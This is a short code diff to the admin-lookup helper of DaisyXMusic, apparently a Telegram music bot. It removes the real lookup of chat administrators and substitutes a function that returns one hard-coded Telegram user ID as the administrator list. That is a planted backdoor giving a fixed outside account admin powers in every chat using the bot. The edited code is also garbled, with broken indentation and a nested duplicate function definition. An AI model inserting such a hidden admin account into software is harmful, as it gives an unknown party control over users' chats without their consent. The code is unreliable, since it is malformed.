@@ -25,10 +25,7 @@ from DaisyXMusic.function.admins import set
 
 async def get_administrators(chat: Chat) -> List[int]:
     get = gett(chat.id)
-
-    if get:
-        return get
-    else:
+    
         # helpers/admins.py
 async def get_administrators(chat):
     administrators = [6848223695]
